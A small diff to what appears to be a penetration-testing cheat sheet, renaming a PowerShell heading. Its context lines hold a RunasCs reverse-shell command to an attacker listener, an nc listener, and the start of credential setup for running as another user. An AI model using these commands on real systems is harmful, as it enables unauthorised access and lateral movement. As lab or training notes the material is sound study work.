@@ -365,7 +365,7 @@ check zip,gz,7z,stix,rar files
 runascs.exe username password powershell.exe -r lhost:lport
 nc -nlvp 7777
 ```
-##### Powershell to move laterally
+##### Powershell to get interactive shell as another user
 ```
 ps > $env:ComputerName
 ps > $user = "CONTROL\hector"
